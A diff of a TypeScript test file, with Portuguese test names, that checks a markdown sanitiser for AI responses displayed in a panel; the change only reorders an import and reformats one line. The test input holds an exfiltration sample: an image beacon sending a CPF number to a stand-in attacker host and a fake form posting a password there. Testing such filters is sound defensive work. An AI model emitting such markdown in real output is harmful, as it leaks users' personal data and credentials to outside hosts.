@@ -1,5 +1,5 @@
-import { JSDOM } from 'jsdom';
 import { beforeAll, describe, expect, it } from 'bun:test';
+import { JSDOM } from 'jsdom';
 
 let markdownSeguro: (md: string) => string;
 
@@ -26,7 +26,9 @@ describe('markdownSeguro (resposta da IA no painel)', () => {
   });
 
   it('bloqueia imagem (beacon que vazaria dados) e formulário falso', () => {
-    const html = markdownSeguro('![x](https://atacante.example/?cpf=123) <form action="https://atacante.example"><input name="senha"></form>');
+    const html = markdownSeguro(
+      '![x](https://atacante.example/?cpf=123) <form action="https://atacante.example"><input name="senha"></form>',
+    );
     expect(html).not.toContain('<img');
     expect(html).not.toContain('atacante.example/?cpf');
     expect(html).not.toContain('<form');
